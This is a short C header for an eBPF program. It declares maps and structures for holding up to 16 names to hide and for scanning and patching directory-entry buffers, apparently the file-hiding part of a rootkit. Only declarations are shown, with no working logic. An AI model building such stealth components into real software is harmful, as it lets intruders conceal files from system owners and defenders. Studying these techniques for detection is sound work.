#pragma once
#define MAX_NAME_LEN 100
#define MAX_DIRENTS 5000
#define MAX_HIDDEN 16

typedef struct {
   __u8 name[MAX_NAME_LEN];
   int name_len;
} hidden_entry_t;

typedef struct {
   __u32 bpos;
   __u64 *dirents_buf;
   long buf_size;
   __u16 reclen;
   __u16 reclen_prev;
   bool patch_succeeded;
} dirent_scan_t;

typedef struct {
   __u8 *name;
   bool found;
} match_ctx_t;

struct {
   __uint(type, BPF_MAP_TYPE_ARRAY);
   __uint(max_entries, MAX_HIDDEN);
   __type(key, u32);
   __type(value, hidden_entry_t);
} hidden_entries SEC(".maps");

struct {
   __uint(type, BPF_MAP_TYPE_HASH);
   __uint(max_entries, 10);
   __type(key, u32);
   __type(value, u64);
} dirent_buf_map SEC(".maps");